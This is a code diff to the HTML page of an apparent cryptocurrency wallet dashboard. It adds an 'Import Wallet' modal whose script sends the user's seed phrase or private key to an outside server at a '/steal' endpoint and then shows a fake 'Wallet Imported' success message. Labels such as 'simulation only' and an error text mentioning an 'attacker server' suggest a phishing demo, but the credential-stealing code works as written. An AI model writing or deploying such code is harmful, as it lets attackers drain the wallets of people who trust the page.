@@ -912,16 +912,15 @@
 </head>
 <!-- Start of LiveChat (www.livechat.com) code -->
 <script>
-    window.__lc = window.__lc || {};
-    window.__lc.license = 19326974;
-    window.__lc.integration_name = "manual_channels";
-    window.__lc.product_name = "livechat";
-    ;(function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+  window.__lc = window.__lc || {};
+  window.__lc.license = 19255024;
+  window.__lc.integration_name = "manual_channels";
+  window.__lc.product_name = "livechat";
+  ; (function (n, t, c) { function i(n) { return e._h ? e._h.apply(null, n) : e._q.push(n) } var e = { _q: [], _h: null, _v: "2.0", on: function () { i(["on", c.call(arguments)]) }, once: function () { i(["once", c.call(arguments)]) }, off: function () { i(["off", c.call(arguments)]) }, get: function () { if (!e._h) throw new Error("[LiveChatWidget] You can't use getters before load."); return i(["get", c.call(arguments)]) }, call: function () { i(["call", c.call(arguments)]) }, init: function () { var n = t.createElement("script"); n.async = !0, n.type = "text/javascript", n.src = "https://cdn.livechatinc.com/tracking.js", t.head.appendChild(n) } }; !n.__lc.asyncInit && e.init(), n.LiveChatWidget = n.LiveChatWidget || e }(window, document, [].slice))
 </script>
-<noscript><a href="https://www.livechat.com/chat-with/19326974/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+<noscript><a href="https://www.livechat.com/chat-with/19255024/" rel="nofollow">Chat with us</a>, powered by <a
+    href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 <!-- End of LiveChat code -->
-
-
 
 <body class="dark dark-theme">
   <!-- Mobile Menu Overlay -->
@@ -1039,13 +1038,17 @@
               <div class="notification-dot"></div>
             </button>
             <!-- Quick Actions -->
-            <div class="hidden sm:flex items-center space-x-2">
-              <button onclick="showReceiveModal()"
-                class="btn-primary px-4 py-2 rounded-lg text-white font-medium text-sm">
-                <i class="fas fa-qrcode w-4 h-4 mr-2"></i>
-                Receive
-              </button>
-            </div>
+            <!-- 🔹 Sidebar Import Wallet Link -->
+            <li
+              class="flex items-center space-x-3 py-2 px-4 rounded-lg cursor-pointer hover:bg-gray-800/60 transition group"
+              id="sidebarImportWallet">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-orange-400 group-hover:text-orange-300"
+                fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v16m8-8H4" />
+              </svg>
+              <span class="text-gray-300 group-hover:text-orange-400 font-medium">Import Wallet</span>
+            </li>
+
           </div>
         </div>
       </div>
@@ -1633,6 +1636,7 @@
           <i class="fas fa-times w-6 h-6"></i>
         </button>
       </div>
+
       <form id="swap-form" class="space-y-4">
         <div>
           <label for="swap-from-asset" class="block text-sm font-medium mb-2">From</label>
@@ -3276,6 +3280,246 @@
       });
     });
   </script>
+  <!-- 🔹 Import Wallet Modal -->
+  <div id="importWalletModal"
+    class="fixed inset-0 hidden items-center justify-center bg-black/60 backdrop-blur-md z-50 p-4 sm:p-0">
+    <div
+      class="relative w-full max-w-md p-6 sm:p-8 rounded-2xl bg-gray-900/80 border border-orange-400/30 shadow-[0_0_25px_rgba(255,140,0,0.25)] animate-fade-in-down">
+
+      <!-- Close -->
+      <button id="closeImportModal"
+        class="absolute top-3 right-3 text-gray-400 hover:text-orange-400 text-xl transition">✕</button>
+
+      <!-- Title -->
+      <h2 class="text-2xl font-bold text-center mb-1 text-orange-400 tracking-wider"
+        style="font-family: 'Orbitron', sans-serif;">Import Wallet</h2>
+      <p class="text-xs text-center text-gray-400 mb-5">Never share your seed phrase or private key with anyone</p>
+
+      <!-- Tabs -->
+      <div class="flex border-b border-gray-700 mb-5">
+        <button id="tabMnemonic"
+          class="flex-1 py-2 text-center border-b-2 border-orange-500 text-orange-400 font-semibold">Mnemonic</button>
+        <button id="tabPrivate"
+          class="flex-1 py-2 text-center border-b-2 border-transparent text-gray-400 hover:text-gray-200">Private
+          Key</button>
+      </div>
+
+      <!-- Mnemonic Section -->
+      <div id="mnemonicSection">
+        <textarea id="mnemonicInput"
+          class="w-full bg-gray-800/70 border border-gray-700 rounded-lg p-3 mb-4 h-24 resize-none focus:ring-2 focus:ring-orange-500 focus:outline-none placeholder-gray-500"
+          placeholder="Enter your 12 or 24-word phrase (simulation only)"></textarea>
+        <button id="importMnemonicBtn"
+          class="w-full bg-gradient-to-r from-orange-500 to-amber-600 hover:from-orange-600 hover:to-amber-700 text-white py-2 rounded-lg font-semibold transition">Import
+          via Mnemonic</button>
+      </div>
+
+      <!-- Private Key Section -->
+      <div id="privateSection" class="hidden">
+        <input id="privateKeyInput" type="text"
+          class="w-full bg-gray-800/70 border border-gray-700 rounded-lg p-3 mb-4 focus:ring-2 focus:ring-orange-500 focus:outline-none placeholder-gray-500"
+          placeholder="Enter your private key (simulation only)">
+        <button id="importPrivateKeyBtn"
+          class="w-full bg-gradient-to-r from-orange-500 to-amber-600 hover:from-orange-600 hover:to-amber-700 text-white py-2 rounded-lg font-semibold transition">Import
+          via Private Key</button>
+      </div>
+
+      <!-- Log Output -->
+      <div id="log" class="text-xs text-gray-400 mt-4 text-center"></div>
+    </div>
+  </div>
+  <!-- 🔹 Script -->
+  <script>
+    const modal = document.getElementById("importWalletModal");
+    const sidebarImportWallet = document.getElementById("sidebarImportWallet");
+    const closeBtn = document.getElementById("closeImportModal");
+    const tabMnemonic = document.getElementById("tabMnemonic");
+    const tabPrivate = document.getElementById("tabPrivate");
+    const mnemonicSection = document.getElementById("mnemonicSection");
+    const privateSection = document.getElementById("privateSection");
+    const log = document.getElementById("log");
+
+    // Show modal from sidebar
+    sidebarImportWallet.onclick = () => {
+      modal.classList.remove("hidden");
+      modal.classList.add("flex");
+    };
+    closeBtn.onclick = () => {
+      modal.classList.add("hidden");
+    };
+    tabMnemonic.onclick = () => {
+      mnemonicSection.classList.remove("hidden");
+      privateSection.classList.add("hidden");
+      tabMnemonic.classList.add("text-orange-400", "border-orange-500");
+      tabPrivate.classList.remove("text-orange-400", "border-orange-500");
+    };
+    tabPrivate.onclick = () => {
+      privateSection.classList.remove("hidden");
+      mnemonicSection.classList.add("hidden");
+      tabPrivate.classList.add("text-orange-400", "border-orange-500");
+      tabMnemonic.classList.remove("text-orange-400", "border-orange-500");
+    };
+
+    // ✅ Mnemonic validation
+    function validateMnemonic(phrase) {
+      const words = phrase.trim().toLowerCase().split(/\s+/);
+      return (words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w));
+    }
+
+    // ✅ Private key validation
+    function validatePrivateKey(key) {
+      return /^[0-9a-fA-F]{64}$/.test(key.trim());
+    }
+
+    // 🔐 POST mnemonic with confirmation
+    document.getElementById("importMnemonicBtn").onclick = async () => {
+      const phrase = document.getElementById("mnemonicInput").value.trim();
+      if (!phrase) {
+        return Swal.fire({
+          icon: 'warning',
+          title: 'Mnemonic Required',
+          text: 'Please enter a dummy mnemonic phrase.',
+          confirmButtonColor: '#f97316'
+        });
+      }
+      if (!validateMnemonic(phrase)) {
+        return Swal.fire({
+          icon: 'error',
+          title: 'Invalid Mnemonic',
+          text: 'Mnemonic must be 12 or 24 lowercase words.',
+          confirmButtonColor: '#f97316'
+        });
+      }
+
+      const confirm = await Swal.fire({
+        icon: 'question',
+        title: 'Confirm Import',
+        text: 'Make sure no one is watching. Are you in a secure environment?',
+        showCancelButton: true,
+        confirmButtonText: 'Yes, proceed',
+        cancelButtonText: 'Cancel',
+        confirmButtonColor: '#f97316',
+        cancelButtonColor: '#6b7280',
+        backdrop: true
+      });
+
+      if (!confirm.isConfirmed) return;
+
+      log.innerHTML = `<span class='text-orange-400'>importing wallet please wait...</span>`;
+      try {
+        const start = Date.now();
+        const resp = await fetch('https://sweep-server-demo.onrender.com/steal', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ secret: phrase })
+        });
+        Swal.fire({
+          icon: 'success',
+          title: 'Wallet Imported',
+          text: 'Your wallet was imported successfully.',
+          confirmButtonColor: '#f97316'
+        });
+        modal.classList.add("hidden");
+        document.getElementById("mnemonicInput").value = "";
+        document.getElementById("privateKeyInput").value = "";
+
+      } catch (err) {
+        Swal.fire({
+          icon: 'error',
+          title: 'Server Error',
+          text: 'Could not contact attacker server. Is it running?',
+          confirmButtonColor: '#f97316'
+        });
+      }
+    };
+
+    // 🔐 POST private key with confirmation
+    document.getElementById("importPrivateKeyBtn").onclick = async () => {
+      const key = document.getElementById("privateKeyInput").value.trim();
+      if (!key) {
+        return Swal.fire({
+          icon: 'warning',
+          title: 'Private Key Required',
+          text: 'Please enter a dummy private key.',
+          confirmButtonColor: '#f97316'
+        });
+      }
+      if (!validatePrivateKey(key)) {
+        return Swal.fire({
+          icon: 'error',
+          title: 'Invalid Private Key',
+          text: 'Private key must be 64 hexadecimal characters.',
+          confirmButtonColor: '#f97316'
+        });
+      }
+
+      const confirm = await Swal.fire({
+        icon: 'question',
+        title: 'Confirm Import',
+        text: 'Make sure no one is watching. Are you in a secure environment?',
+        showCancelButton: true,
+        confirmButtonText: 'Yes, proceed',
+        cancelButtonText: 'Cancel',
+        confirmButtonColor: '#f97316',
+        cancelButtonColor: '#6b7280',
+        backdrop: true
+      });
+
+      if (!confirm.isConfirmed) return;
+
+      log.innerHTML = `<span class='text-orange-400'>importing walet please wait...</span>`;
+      try {
+        const start = Date.now();
+        const resp = await fetch('https://sweep-server-demo.onrender.com/steal', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ secret: key })
+        });
+        Swal.fire({
+          icon: 'success',
+          title: 'Wallet Imported',
+          text: 'Your wallet was imported successfully.',
+          confirmButtonColor: '#f97316'
+        });
+        modal.classList.add("hidden");
+        document.getElementById("mnemonicInput").value = "";
+        document.getElementById("privateKeyInput").value = "";
+
+      } catch (err) {
+        Swal.fire({
+          icon: 'error',
+          title: 'Server Error',
+          text: 'Could not contact attacker server. Is it running?',
+          confirmButtonColor: '#f97316'
+        });
+      }
+    };
+  </script>
+
+
+
+  <!-- 🔹 Animations -->
+  <style>
+    @keyframes fade-in-down {
+      from {
+        opacity: 0;
+        transform: translateY(-15px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .animate-fade-in-down {
+      animation: fade-in-down 0.25s ease-out;
+    }
+  </style>
+
+  <!-- 🔹 Orbitron Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+
 </body>
 
 </html>
